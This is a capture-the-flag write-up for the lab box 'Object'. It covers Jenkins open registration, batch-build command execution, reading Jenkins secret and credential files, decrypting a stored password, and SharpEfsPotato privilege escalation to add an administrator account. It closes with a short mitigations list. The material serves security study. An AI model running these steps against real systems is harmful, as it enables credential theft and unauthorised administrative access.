

# Object

- Introduction
- Summary
- Walkthrough
- Mitigations
- References


## Introduction 

The object box shows the importance of access controls, process isolation and the risks of exposing service to the wider internet. The privilege escalation on this box shows  how even features working as intended also have risks. 

## Summary 

The box start with a open registration form which allowed the tester to create an account with the Jenkins service. The Jenkins service has a "Freestyle" project feature that has a batch script build options that allowed the tester to run batch scripts on the box. The tester was able to escalation privileges using the "SeImpersonatePrivilege" privilege held by the "oliver" account. 

## Walkthrough

The tester started by identifying open ports using "nmap".

```
┌──(kali㉿kali)-[~]
└─$ nmap -p 80,5985,8080 -sV  10.10.11.132
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 09:34 EDT
Nmap scan report for object.htb (10.10.11.132)
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp open  http    Jetty 9.4.43.v20210629
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds                                                               
```

The scan showed that port 8080 was running the Jenkins web service. The Jenkins service allowed open sign up. 
![Jenkins sign up](https://i.imgur.com/ahWME9o.png)

Once the tester had signed up they were able to create "Freesyle projects". A "Freesyle project" is able to build(run) bat scripts on the target host. The tester tested this feature by using the "whoami /all" command. The project needs a trigger to start building, in this case the tester used the periodically options, which triggered the build every minute.

[![The trigger settings](https://imgur.com/XwBIUju.png)

![The build batch script](https://imgur.com/6HOgRCb.png)

After the project ran the tester was able to view the outcome of the build process from the console output option. The command ran successfully showing the service is running under the "oliver" account. 

[![https://imgur.com/9JK5S3Z.png](https://imgur.com/9JK5S3Z.png)](https://imgur.com/9JK5S3Z.png)

After some research the tester found this script, "https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py", which is used to decrypt a users password. This script requires three pieces of information, the master key, the hudson.util.secret file and the credential file, in this case the tester used the config.xml file in the admin user folder. The tester used the previous "freestyle project" method to run commands on the system to print the files.  Below is the console output from the three project builds used to obtain the files. 

``` Getting the secret.key
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins8817444821169889104.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>type c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secret.key 
ac5757641b505503f44d2752ffa01e621bf5b935763ebc8adaa2e90cf85b13ac
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

``` Getting the admin user config file.
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins7654426993780461805.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>type C:\users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>

<snip>

          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
              
<snip>
            
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>
C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

The "hudson.util.Secret" file is not a human readable file therefore, to ensure a success transfer, the tester first encoded the file into base64 to remove any potential issues. 
``` Encoding the hudson.util.Secret file. 
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins7113208533890243962.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>certutil -encode c:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret c:\Users\oliver\hudson.util.Secret.b64    & type c:\Users\oliver\hudson.util.Secret.b64 
Input Length = 272
Output Length = 432
CertUtil: -encode command completed successfully.
-----BEGIN CERTIFICATE-----
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu
2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO
kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2L
AORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9
GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc
pBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
-----END CERTIFICATE-----

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

The Tester decoded the code on their machine. 

```
└─$ echo "gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu
2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHO
kX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2L
AORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9
GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzc
pBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=" | tr -d "\n" | base64 -d > hudson.util.Secret

```
Once all the needed files were collected the tester used the script to decrypt the "oliver" account password. 

```
└─$ python3 '/home/kali/Documents/Tools/jenkins/jenkins_offline_decrypt.py' '/home/kali/Documents/object/master.key' '/home/kali/Documents/object/hudson.util.Secret' '/home/kali/Documents/object/cred.xml' 
c1cdfun_d2434
```

The tester was then able to log into the host using windows remote management.  The tester reviewed the privileges of the user which differed from the output of the "Jenkins"  app despite being the same account.

```
*Evil-WinRM* PS C:\Users\oliver\Documents> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
object\oliver S-1-5-21-4088429403-1159899800-2753317549-1103


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

The Jenkins service privilege had the  "SeImpersonatePrivilege" privilege. This privilege allows the holder to impersonate a SYSTEM level token and execute a process.  The tester used the "https://github.com/bugch3ck/SharpEfsPotato" tool to exploit this vulnerability and uploaded it using the "Evil-winrm" upload feature.

```
*Evil-WinRM* PS C:\Users\oliver\Documents> upload SharpEfsPotato.exe
                                        
Info: Uploading /home/kali/Documents/Tools/priv_esc/SharpEfsPotato.exe to C:\Users\oliver\Documents\SharpEfsPotato.exe
                                        
Data: 93524 bytes of 93524 bytes copied
                                        
Info: Upload successful!
```
The tester used the "freestyle project" method once again to test the "SharpEfsPotato" exploit by using the ping command. The command used in the build batch script was:

```
C:\Users\oliver\documents\SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "ping -n 3 10.10.14.19" 
```

```The project console output.
Started by time
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins10258639311092159459.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>C:\Users\oliver\documents\SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "ping -n 3 10.10.14.19" 
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/34596a48-e682-41f8-8085-10351cf0e784/\34596a48-e682-41f8-8085-10351cf0e784\34596a48-e682-41f8-8085-10351cf0e784
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```

The tester used "tcpdump" to monitor the incoming pings.
```tcpdump
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:38:03.979961 IP object.htb > 10.10.14.19: ICMP echo request, id 1, seq 763, length 40
14:38:03.979995 IP 10.10.14.19 > object.htb: ICMP echo reply, id 1, seq 763, length 40
14:38:04.992936 IP object.htb > 10.10.14.19: ICMP echo request, id 1, seq 766, length 40
14:38:04.992956 IP 10.10.14.19 > object.htb: ICMP echo reply, id 1, seq 766, length 40
14:38:06.010512 IP object.htb > 10.10.14.19: ICMP echo request, id 1, seq 769, length 40
14:38:06.010533 IP 10.10.14.19 > object.htb: ICMP echo reply, id 1, seq 769, length 40

```
As the target was well firewalled the tester decided to create a new user with SYSTEM privileges.  First the tester created a user, then added it to the administrator group.

```
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins7079034259087297973.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>C:\Users\oliver\documents\SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "net user /add notahacker Password246" 
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/889b6e04-3992-4998-8cb5-da9b83cfb232/\889b6e04-3992-4998-8cb5-da9b83cfb232\889b6e04-3992-4998-8cb5-da9b83cfb232
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```


```
*Evil-WinRM* PS C:\Users\oliver\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
maria                    notahacker               oliver
The command completed with one or more errors.

```


```
Started by timer
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project
[project] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins10848734177499432175.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>C:\Users\oliver\documents\SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "net localgroup administrators notahacker /add" 
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/33c4357b-c82b-4b56-b195-1bd0308e9d38/\33c4357b-c82b-4b56-b195-1bd0308e9d38\33c4357b-c82b-4b56-b195-1bd0308e9d38
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\project>exit 0 
Finished: SUCCESS
```


```
*Evil-WinRM* PS C:\Users\oliver\Documents> net user notahacker
User name                    notahacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            9/1/2024 12:18:01 PM
Password expires             10/13/2024 12:18:01 PM
Password changeable          9/2/2024 12:18:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users
The command completed successfully.

```

Once the tester had been created the user, they were able to login with the new credentials and have an administrator level account.

```
└─$ evil-winrm -i 10.10.11.132 -u notahacker -p 'Password246'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\notahacker\Documents> whoami
object\notahacker

```


```
*Evil-WinRM* PS C:\Users\notahacker\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```


## Mitigations 

-  Consider increasing the Security Realm and Authorization configurations to limit feature usage 
-  If Jenkins external network exposure isn't necessary consider blocking external access. 
- Review the account Jenkin runs under and consider using a specific account for this purpose, this could limit the damage in the event of a breach. 

## References
https://www.jenkins.io/doc/book/security/managing-security/
https://www.jenkins.io/doc/book/security/securing-jenkins/
https://www.jenkins.io/doc/book/security/access-control/
https://github.com/bugch3ck/SharpEfsPotato
